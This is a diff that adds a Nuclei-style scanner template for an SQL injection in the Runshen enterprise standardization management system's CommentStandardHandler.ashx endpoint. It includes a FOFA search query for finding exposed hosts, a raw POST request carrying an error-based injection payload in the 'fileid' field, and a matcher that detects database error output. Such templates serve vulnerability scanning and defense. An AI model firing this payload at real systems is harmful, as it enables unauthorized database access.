@@ -1,0 +1,27 @@
+id: runshen-CommentStandardHandler-sqli
+
+info:
+  name: 润申企业标准化管理系统-SQL注入-CommentStandardHandler
+  author: HuanXiong
+  severity: critical
+  metadata: 
+    fofa-query: body="PDCA/js/_publicCom.js"
+
+  tags: SQL Injection
+
+http:
+  - raw:
+      - |
+        POST /PDCA/ashx/CommentStandardHandler.ashx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Encoding: gzip
+
+        action=detailInfo&fileid=1 and (select db_name())>0--
+        
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - 'status_code==500 && contains_all(body,"nvarchar")'
